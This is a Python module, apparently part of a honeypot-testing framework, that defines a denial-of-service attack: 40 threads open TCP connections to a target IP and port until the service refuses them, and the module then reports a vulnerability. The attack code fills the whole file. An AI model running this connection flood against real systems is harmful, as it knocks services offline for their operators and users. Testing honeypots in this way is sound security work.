import time
import socket
import threading
from base_attack import BaseAttack

class DoS(BaseAttack):
    def __init__(self, honeypot):
        super().__init__(honeypot)

    def attack(self):
        """
        Attempt to flood the honeypot with connections until it starts rejecting them.
        """
        while not self.honeypot_rejecting_connections:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                sock.connect((self.honeypot.get_ip(), self.honeypot.get_port()))
                time.sleep(0.01)
            except Exception:
                self.honeypot_rejecting_connections = True
            finally:
                sock.close()

    def run_attack(self, num_threads=40):
        """
        Launch the DoS attack using multiple threads.
        """
        print(f"Running DoS attack on {self.honeypot.get_ip()}:{self.honeypot.get_port()}...")
        self.honeypot_rejecting_connections = False
        threads = [threading.Thread(target=self.attack) for _ in range(num_threads)]

        start_time = time.time()

        for thread in threads:
            thread.start()

        while not self.honeypot_rejecting_connections:
            time.sleep(1)

        for thread in threads:
            thread.join()
        
        
        end_time = time.time()
        time_taken = end_time - start_time

        return True, "Vulnerability found: DoS attack made the SSH honeypot reject connections", time_taken, num_threads